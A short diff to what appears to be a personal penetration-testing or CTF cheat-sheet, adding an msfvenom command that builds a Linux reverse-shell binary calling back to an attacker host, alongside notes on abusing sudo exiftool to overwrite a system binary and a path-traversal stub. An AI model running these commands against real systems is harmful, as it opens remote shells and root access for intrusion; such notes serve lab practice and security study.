@@ -18,6 +18,9 @@ chmod +x binary
 sudo /usr/local/bin/exiftool -filename=/usr/bin/app (binary path)
 sudo /usr/bin/app
 
+* generate shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=urip LPORT=4444 -f elf -o shell.elf
+
 * path traversal vuln:
 ../../../../../../../../...................
 
